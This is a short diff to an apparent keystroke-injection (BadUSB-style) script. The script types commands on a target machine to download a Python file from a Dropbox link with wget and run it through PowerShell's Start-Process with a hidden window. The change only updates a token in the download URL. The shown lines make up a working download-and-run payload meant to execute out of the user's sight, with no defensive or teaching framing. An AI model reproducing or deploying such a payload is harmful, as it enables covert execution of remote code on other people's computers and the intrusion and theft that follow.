@@ -8,7 +8,7 @@ delay(2000)
 type("cd system_files") // Go to working directory
 press("ENTER")
 delay(500)
-type('wget "https://www.dropbox.com/scl/fi/x4mvx0wc4epa9g3lug2vj/download_dropbox.py?rlkey=f76fhl9769c0n7cgfr6nbag3h&st=dw0rxs85&dl=1" -O download_dropbox.py') // Download download_dropbox.py
+type('wget "https://www.dropbox.com/scl/fi/x4mvx0wc4epa9g3lug2vj/download_dropbox.py?rlkey=f76fhl9769c0n7cgfr6nbag3h&st=pfq90otv&dl=1" -O download_dropbox.py') // Download download_dropbox.py
 press("ENTER")
 delay(2000)
 type("Start-Process python download_dropbox.py -WindowStyle Hidden") // Run download_dropbox.py in the background
